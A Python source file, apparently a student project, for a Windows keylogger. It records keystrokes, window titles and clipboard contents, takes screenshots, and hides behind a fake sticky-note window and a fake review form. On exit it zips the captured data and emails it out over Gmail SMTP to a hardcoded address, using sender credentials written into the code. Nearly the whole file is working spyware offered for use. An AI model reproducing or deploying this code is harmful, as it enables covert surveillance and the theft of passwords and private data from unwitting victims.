'''
Welcome to my Key-Logger project

Features:
-Key-logging 
-Formatted Key-logging
-Window name logging
-Clipboard data logging
-Automatic screenshots
-AES Encryption
-Emailing
-Files Compression

'''
#Libraries
from zipfile import ZipFile                     #Managing & Creating Zip files              
from cryptography.fernet import Fernet          #AES encryption (Symmetric Encryption)
from pynput.keyboard import Listener            #Key Logging

#Email Libraries
from email.mime.multipart import MIMEMultipart  
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import os,sys,datetime                          #OS & System information
import win32gui, win32clipboard                 #Window name and Clipboard Data
import pyscreenshot                             #Screenshots

from tkinter import *                           #GUI Library
from KeyDictionary import Key_Dictionary        #Python script refrence
#------------------------------------------------------------------------------------------------
#Counters and Global Variables
KeyCount = 0                                    #Logged key counter
ScreenshotCount = 0                             #Screenshot counter
isKeylogging = True                             #State boolean
CurrentWindow = ""                              #Current window placeholder
OldClipboardData = ""                           #Previous Clipboard data placeholder
ToAddress= "assignment.randomcode@gmail.com"    #Recepient E-mail address placeholder
#------------------------------------------------------------------------------------------------
#Reporting Files
Full_Log = open("Full_Log.txt",'a',encoding="utf-8")            #Unformatted log (Console-like)
Formatted_Log = open("Formatted_Log.txt",'a',encoding="utf-8")  #Formatted log (readable)
Clipboard_Log = open("clipboard.txt","a",encoding="utf-8")      #Clipboard logging
#------------------------------------------------------------------------------------------------
#Sticky Note Style Settings
TitleFont = ("Comic Sans MS", 12, "bold")       #Font for disguise titles
TextFont = ("Comic Sans MS", 10)                #Font for disguise text 

TitleColor = "#e4bc04"                          #Title text color
TextColor = "#eeeeee"                           #Text color
BackgroundColor = "#333333"                     #Background color
#------------------------------------------------------------------------------------------------
#Key Logger
#Function called on program start
#Initial setup
def OnStart():
    #Check if a Screenshot folder exist
    try:
        #Create a folder
        os.mkdir("Screenshots")
        print("Welcome to my keylogger ;)")
    except:
        #Welcome message
        print("Welcome to my keylogger ;)")
    
    #Write a start message with date and time of capture, in all log files
    Starting_Message = "\nStarted Capturing at: "+ datetime.datetime.now().strftime(" %H:%M:%S")+"\n"
    Full_Log.write(Starting_Message)
    Formatted_Log.write(Starting_Message)
    Clipboard_Log.write(Starting_Message)

#Function called every key press
def OnPress(key):
    #Global variable refrences
    global KeyCount,Full_Log,Formatted_Log,TimeOfPress

    #Check if the program is keylogging
    if isKeylogging:
        #Store the time of press
        TimeOfPress = datetime.datetime.now().strftime("%H:%M:%S")
        #Format the Key into a string
        key = "{0}".format(key)

        #Remove the quotation marks
        key = str(key).replace("'","")
        
        #Increase Key counter by 1
        KeyCount += 1
        
        GetCurrentWindowName()   #Checks for window name change
        CopyClipboard()         #Check for clipboard data change
        Write2File(key)         #Update Log files
        Write2FormattedLog(key) #Update Formatted Log files
        Printer(key)            #Print key to console

#Function called every key release
def OnRelease(key):
    #Return keylogger state
    return isKeylogging

#Function called on program exit
#Ending procedures
def OnExit():
    #Global variable refrences
    global Start,ToAddress,KeyCount
    print("Exiting..")
    
    #Check for user input in the email entry
    if EmailEntry.get() != "":
        #Update the ToAddress with user input
        ToAddress = EmailEntry.get()
   
    #Check for clipboard data change
    CopyClipboard()
    
    #Write an end message with date and time of capture, in all log files
    Ending_Message = "\nStopped Capturing at: "+ datetime.datetime.now().strftime(" %H:%M:%S")+"\n"+ ("-"*50) 
    
    Full_Log.write(Ending_Message)
    Formatted_Log.write("\n{} Keys were logged".format(KeyCount) + Ending_Message)
    Clipboard_Log.write(Ending_Message)
    
    #Close all log files
    Formatted_Log.close()
    Full_Log.close()
    Clipboard_Log.close()

    #Take a screenshot 
    Screenshot()
    
    #Encrypt the files
    GenerateKey()
    Encrypt("Full_log.txt","Encrypted_Full log.txt")
    Decrypt("Encrypted_Full log.txt", "Decrypted_Full log.txt")
    
    #Create a Zip file
    ZipFiles()
    
    #try to send the email
    try:
        Email("Data.zip",ToAddress)
    except:
        #Print an error message to the user
        print("Cant Send TO:",ToAddress)
        print("!!PLEASE MAKE SURE U ARE CONNECTED TO THE INTERNET TO SEND THE EMAIL!!")
    
    #Exit Statment
    print("Exited at:",datetime.datetime.now().strftime("%H:%M:%S"))
    #Exit the program properly
    sys.exit()
#------------------------------------------------------------------------------------------------
#Features
#Function for updating the current window name 
def GetCurrentWindowName():
    global CurrentWindow
    #Get current window name
    New_Window_Name = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    #Compare to previous window name
    if not New_Window_Name == CurrentWindow:
        #Update Current window name
        CurrentWindow = New_Window_Name
        #Update formated log with the new window title
        Formatted_Log.write("\n"+New_Window_Name+":-"+"\n"+("-"*len(New_Window_Name))+"\n")

        #Optional on powerful systems (Needs alot of processing -> Slows down the Device)
        #ScreenShot()
        #write To file a line with window name

#Function for copying the Clipboard to a txt file
def CopyClipboard():
    #Global variable refrences
    global OldClipboardData
    
    #Try to get clipboard data
    try:
        #Open Cliboard
        win32clipboard.OpenClipboard()
        #Get new Clipboard data
        CurrentClipboardData= win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        #Compare old & new data
        if CurrentClipboardData != OldClipboardData:
            #Save new data to log file
            print("Copying Clipboard..")
            Clipboard_Log.write(str(CurrentClipboardData)+" was added to the clipboard at: "+datetime.datetime.now().strftime(" %H:%M:%S")+"\n")
            #Store previous clipboard data
            OldClipboardData= CurrentClipboardData
    except:
        #Check if Clipboard data chnaged
        if OldClipboardData != "Clipboard cannot be copied \n":
            #Change OldClipboardData
            OldClipboardData = "Clipboard cannot be copied \n"
            
            #Empty Clipboard
            win32clipboard.EmptyClipboard()
            
            #Fail statment
            print(OldClipboardData)
            Clipboard_Log.write(OldClipboardData)
    finally:
        #Close Clipboard
        win32clipboard.CloseClipboard()

#Function for taking a Screenshot
def Screenshot():
    global ScreenshotCount
    print("Taking ScreenShot..")
    #To capture the screen
    image = pyscreenshot.grab()
    #Try to save image 
    try:
        #Save with the window name as file name
        image.save(sys.path[0]+"/Screenshots/%s.png" % (CurrentWindow +"-"+ str(ScreenshotCount)))
    except:
        #Save as Screenshot-counter.png
        image.save(sys.path[0]+"/Screenshots/%s.png" % ("Screenshot-" + str(ScreenshotCount)))
    
    #Increase counter by 1
    ScreenshotCount += 1
#------------------------------------------------------------------------------------------------
#Disguise
#Function to create a fake sticky-note window
def StickyNote():
    #Global variable refrence
    global StickyWindow

    #Setup window configuration
    StickyWindow = Tk()                 #Create window object
    StickyWindow.title("Sticky-Note")   #Change window Title
    StickyWindow.geometry("400x400")    #Set winow dimensions
    
    #Setup responsitivity configuration
    StickyWindow.grid_columnconfigure(0, weight=1)  #X-axis
    StickyWindow.grid_rowconfigure(0, weight=1)     #Y-axis

    #Setup a textbox
    Textbox = Text(font=TextFont,bg=BackgroundColor,fg=TextColor)   
    Textbox.grid(row=0,column=0,sticky=NSEW)    
    
    #Run stoplogger function on window close event
    StickyWindow.protocol("WM_DELETE_WINDOW", StopLogger)
    #Start window
    StickyWindow.mainloop()

#Function to stop the keylogging
def StopLogger():
    #Global variable refrence
    global isKeylogging

    print("Key-logging stopped")
    isKeylogging = False
    #Destroy StickyNote window
    StickyWindow.destroy()
    #Launch review window
    ReviewWindow()

#Function to create a fake review window
def ReviewWindow():
    #Global variable refrences
    global StickyWindow, EmailEntry,Textbox
    
    #Setup window configuration
    ReviewWindow = Tk()                     #Create window object
    ReviewWindow.title("Review")            #Change window Title
    ReviewWindow.geometry("400x400")        #Set winow dimensions
    ReviewWindow.config(bg=BackgroundColor) #Set background Color
    
    #Setup responsitivity configuration
    ReviewWindow.grid_columnconfigure(1, weight=1)  
    EmailEntry = StringVar(ReviewWindow)
    #--------------------------------------------------------------------------------------------
    #Create GUI elements

    #Create a Label and setup the Font
    EmailLBL =Label(ReviewWindow,text="Email:",font=TitleFont,bg=BackgroundColor, fg= TitleColor)
    #Create an Entry and setup the Font
    EmailEF = Entry(ReviewWindow,textvariable=EmailEntry,font=TextFont,bg=BackgroundColor,fg= TextColor)

    #Create a Label and setup the Font
    ReviewLBL =Label(ReviewWindow,text="Review:",font=TitleFont,bg=BackgroundColor,fg= TitleColor)
    #Create a textbox and setup the Font
    Textbox = Text(ReviewWindow,font = TextFont,height=15,bg=BackgroundColor,fg=TextColor)

    #Create and Setup the submit button
    Submitbtn = Button(text="Submit",bg="Green",fg="White",height=2,width=10,command=OnExit)
    #--------------------------------------------------------------------------------------------
    #Postion GUI elements
    EmailLBL.grid(row = 0, column = 0, sticky = NSEW, pady = 4)
    EmailEF.grid(row = 0, column = 1, sticky = EW, pady = 4)

    ReviewLBL.grid(row = 1, column = 0, sticky = NSEW, pady = 4)
    Textbox.grid(row = 2,columnspan = 2 ,sticky=NSEW,padx=4)

    Submitbtn.grid(row = 4,column=1,sticky=E)
    #------------------------------------------------------------------------------------------------
    #Run the onExit function on window close
    ReviewWindow.protocol("WM_DELETE_WINDOW", OnExit)
    ReviewWindow.mainloop()    
#------------------------------------------------------------------------------------------------    
#Reporting Methods

#Function that prints a key statment to the console
def Printer(key):
    #Print the key to the console with time of press and window name
    print(key,"Pressed at",TimeOfPress,"Window:",CurrentWindow)

#Function to log keys to a txt files
def Write2File(key):
    #Write to the full Log
    Full_Log.write(key + " Pressed at:" + TimeOfPress + " Window: " + CurrentWindow + "\n")

#Function to log keys in a readable formatted txt file
def Write2FormattedLog(key):
    #Check if the key is a single character 
    if len(key) == 1:
        #Write the key to the formatted log file
        Formatted_Log.write(key)
    else:
        try:
            #Look up dictionary for a corresponding value
            #Write to the file
            Formatted_Log.write(Key_Dictionary[key])
        except:
            #Write to the file 
            Formatted_Log.write(" "+key)         

#Function to send an email with an attached file
def Email(FileName,ToAddress):
    print("Sending Email..")

    #Credentials to the sending email
    email_address = "definitely.a.stickynote@gmail.com"
    password = "K3yl0gg3r"
    
    #Instance of MIMEMultipart
    msg= MIMEMultipart()

    #Storing the senders email address  
    msg['From'] = email_address
    #Storing the receivers email address 
    msg['To'] = ToAddress
    #Storing the subject 
    msg['Subject']= "Log Files"
    #String to store the body of the mail
    body = "find attached the keylogger files"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    # open the file to be sent 
    attachment= open(sys.path[0]+"\{}".format(FileName), 'rb')

    #Instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')
    #To change the payload into encoded form
    p.set_payload((attachment).read())
    #Encode into base64
    encoders.encode_base64(p)
    #Attach the instance 'p' to instance 'msg'
    p.add_header('Content-Disposition', "attachment; filename= %s" % FileName)
    msg.attach(p)

    #Creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    #Start TLS for security
    s.starttls()
    #Authentication
    s.login(email_address, password)
    #Converts the Multipart msg into a string
    text=msg.as_string()
    #Sending the mail
    s.sendmail(email_address, ToAddress, text)
    # terminating the session
    s.quit()
   
    print("Done..")

#Function that compresses files into a zip folder
def ZipFiles():
    print("Compressing..")
    #Create a zipfile 
    with ZipFile('Data.zip', 'w') as zipObj:
        #Add multiple files to the zip
        zipObj.write('Formatted_Log.txt')
        zipObj.write('Full_Log.txt')
        zipObj.write('key.key')
        zipObj.write('Decrypted_Full log.txt')
        zipObj.write('Encrypted_Full log.txt')
        zipObj.write('clipboard.txt')

        #Iterate over all the files in directory
        for folderName, Subfolders ,filenames in os.walk("Screenshots"):
            for filename in filenames:
                #create complete filepath of file in directory
                filePath = os.path.join(folderName, filename)
                # Add file to zip
                zipObj.write(filePath, os.path.basename(filePath))
#------------------------------------------------------------------------------------------------
#Encryption
#Function to generate an encryption key
def GenerateKey():
    #Open a file to store the key
    with open(sys.path[0] +"/"+"key.key","wb") as f:
        #Generate a key and write to the file
        f.write(Fernet.generate_key())

#Function that encrypts a file using a key and stores it in a new file
def Encrypt(FileName,EncryptedFileName):
    print("Encrypting ..")
    
    #Open the file storing the key
    with open(sys.path[0] +"/"+'key.key','rb') as f:
        #Get and store the encryption key
        EncryptionKey = f.read()
    
    #Open the file to encrpyt
    with open(sys.path[0] +"/"+FileName,"rb") as f:
        #store the file data
        data = f.read()

    #Create the Fernet encryption Object
    fernet = Fernet(EncryptionKey)
    #Encrypting and storing the data
    encrypted = fernet.encrypt(data)

    #Open a new file to store the encrypted data
    with open(sys.path[0] +"/"+EncryptedFileName,"wb") as f:
        #write the encrypted data to the file
        f.write(encrypted)

#Function that decrypts a file using a key and stores it in a new file
def Decrypt(EncryptedFileName,DecryptedFileName): 
    print("Decrypting..")
    
    #Open the file storing the key
    with open(sys.path[0] +"/"+'key.key','rb') as f:
        #Get and store the encryption key
        DecryptionKey = f.read()

    #Open the file to decrpyt
    with open(sys.path[0] +"/"+EncryptedFileName,"rb") as f:
        #store the file data
        encrypted = f.read()

    #Create the Fernet encryption Object
    fernet = Fernet(DecryptionKey)
    #Decrypting and storing the data
    decrypted = fernet.decrypt(encrypted)

    #Open a new file to store the decrypted data
    with open(sys.path[0] +"/"+DecryptedFileName,"wb") as f:
         #write the encrypted data to the file
        f.write(decrypted)
#----------------------------------------------------------------------------------------------------
#Code to Run
#Calling on Start
OnStart()

#Intializing a Key Listner
with Listener(on_press = OnPress, on_release = OnRelease) as listener:
    #Starting Fake Stickynote
    StickyNote()  
    #Starts the key listener  
    listener.join()
